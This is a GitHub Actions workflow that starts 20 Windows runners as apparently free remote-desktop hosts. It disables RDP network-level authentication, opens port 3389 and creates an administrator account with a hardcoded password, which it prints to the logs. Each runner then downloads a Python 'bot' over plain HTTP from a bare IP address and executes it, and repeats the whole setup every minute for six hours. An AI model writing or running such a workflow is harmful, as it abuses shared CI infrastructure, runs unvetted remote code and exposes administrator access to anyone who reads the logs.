name: RDP on Old Windows Versions Only

on:
  workflow_dispatch:

jobs:
  setup-rdp:
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: windows-2019
            server: 1
          - os: windows-2019
            server: 2
          - os: windows-2019
            server: 3
          - os: windows-2019
            server: 4
          - os: windows-2019
            server: 5
          - os: windows-2019
            server: 6
          - os: windows-2019
            server: 7
          - os: windows-2019
            server: 8
          - os: windows-2019
            server: 9
          - os: windows-2019
            server: 10
          - os: windows-2022
            server: 11
          - os: windows-2022
            server: 12
          - os: windows-2022
            server: 13
          - os: windows-2022
            server: 14
          - os: windows-2022
            server: 15
          - os: windows-2022
            server: 16
          - os: windows-2022
            server: 17
          - os: windows-2022
            server: 18
          - os: windows-2022
            server: 19
          - os: windows-2022
            server: 20

    runs-on: ${{ matrix.os }}
    timeout-minutes: 3600

    steps:
      - name: Enable RDP and Create User
        shell: pwsh
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP" 2>$null
          netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
          Restart-Service TermService -Force
          $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
          if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name "TOOLBOXLAP" -Force
          }
          New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
          try {
              $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
          } catch {
              $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
          }
          Write-Host ""
          Write-Host "============================================"
          Write-Host "RDP CONNECTION INFO"
          Write-Host "============================================"
          Write-Host "Server Number : ${{ matrix.server }}"
          Write-Host "Windows OS    : ${{ matrix.os }}"
          Write-Host "IP Address    : $ip"
          Write-Host "Port          : 3389"
          Write-Host "Username      : TOOLBOXLAP"
          Write-Host "Password      : admin@123"
          Write-Host "============================================"
          $desktop = [Environment]::GetFolderPath("Desktop")
          $infoFile = "$desktop\RDP_INFO_SERVER_${{ matrix.server }}.txt"
          "IP: $ip`nUser: TOOLBOXLAP`nPass: admin@123" | Out-File -FilePath $infoFile

      - name: Download and Run Bot
        shell: pwsh
        run: |
          $desktop = [Environment]::GetFolderPath("Desktop")
          $botUrl = "http://82.47.102.153:5000"
          for ($i = 1; $i -le 3; $i++) {
              try {
                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
                  break
              } catch {
                  Start-Sleep -Seconds 5
              }
          }
          $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
          if (-not $pythonPath) {
              $installer = "$env:TEMP\python.exe"
              Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile $installer
              Start-Process -FilePath $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
              Remove-Item $installer -Force
              Start-Sleep -Seconds 10
              $pythonPath = "C:\Python311\python.exe"
          }
          if (Test-Path "$desktop\bot.py") {
              Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
          }

      - name: Rotate Servers Every Minute (Kill Current, Start New)
        shell: pwsh
        run: |
          $endTime = (Get-Date).AddHours(6)
          $serverNum = ${{ matrix.server }}
          $os = "${{ matrix.os }}"
          $desktop = [Environment]::GetFolderPath("Desktop")
          
          Write-Host ""
          Write-Host "===== ROTATION MODE ENABLED ====="
          Write-Host "Server $serverNum will rotate every 60 seconds"
          Write-Host "Each rotation: kills current, resets, starts new RDP session"
          Write-Host "================================="
          Write-Host ""

          while ((Get-Date) -lt $endTime) {
              # Get current IP
              try {
                  $currentIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
              } catch {
                  $currentIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
              }
              
              Write-Host "[$(Get-Date)] Server $serverNum ACTIVE - RDP: $currentIp:3389"
              
              # Wait 60 seconds
              Start-Sleep -Seconds 60
              
              Write-Host "[$(Get-Date)] ROTATING: Killing current RDP session on Server $serverNum..."
              
              # Kill RDP service to disconnect all sessions
              Stop-Service TermService -Force -ErrorAction SilentlyContinue
              
              # Kill any running bot processes
              Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
              
              # Clear RDP settings
              Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
              
              # Reset firewall
              netsh advfirewall firewall delete rule name="RDP" 2>$null
              netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
              
              # Restart RDP with new session
              Restart-Service TermService -Force -ErrorAction SilentlyContinue
              
              # Recreate user (force refresh)
              $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
              if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
                  Remove-LocalUser -Name "TOOLBOXLAP" -Force
              }
              New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
              Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
              
              # Redownload and run bot
              $botUrl = "http://82.47.102.153:5000"
              try {
                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
              } catch {
                  Write-Host "[$(Get-Date)] Failed to download fresh bot"
              }
              
              $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
              if (-not $pythonPath) {
                  $pythonPath = "C:\Python311\python.exe"
              }
              if (Test-Path "$desktop\bot.py") {
                  Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
                  Write-Host "[$(Get-Date)] Bot restarted with fresh copy"
              }
              
              # Get new IP after rotation
              Start-Sleep -Seconds 5
              try {
                  $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
              } catch {
                  $newIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
              }
              
              Write-Host "[$(Get-Date)] ROTATION COMPLETE - New IP: $newIp"
              Write-Host "============================================"
              
              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
              Write-Host "[$(Get-Date)] Server $serverNum - $remaining minutes remaining until 6-hour limit"
              Write-Host ""
          }
          
          Write-Host ""
          Write-Host "===== SERVER $serverNum SESSION COMPLETED (6 hours) ====="
